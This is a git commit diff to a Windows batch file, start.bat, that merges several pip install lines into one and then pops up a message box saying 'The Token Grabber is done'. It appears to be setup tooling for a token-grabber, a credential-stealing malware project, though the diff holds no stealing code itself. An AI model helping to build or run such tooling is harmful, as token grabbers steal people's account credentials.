0934cb22f6df86b61f5e7301854cc6429b8f2bf9
AROUWA <dorukkayar6524@gmail.com>
2024-11-09 12:26:17 +0300

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,8 +1,5 @@
 @echo off
-pip install requests
-pip install pypiwin32
-pip install pywin32
-pip install pillow
+pip install requests pyautogui pycryptodome Pillow pywin32
 echo x = msgbox("Token Grabber",5+5,"The Token Grabber is done, you can use it now !") > main.vbs
 start main.vbs
 del main.vbs
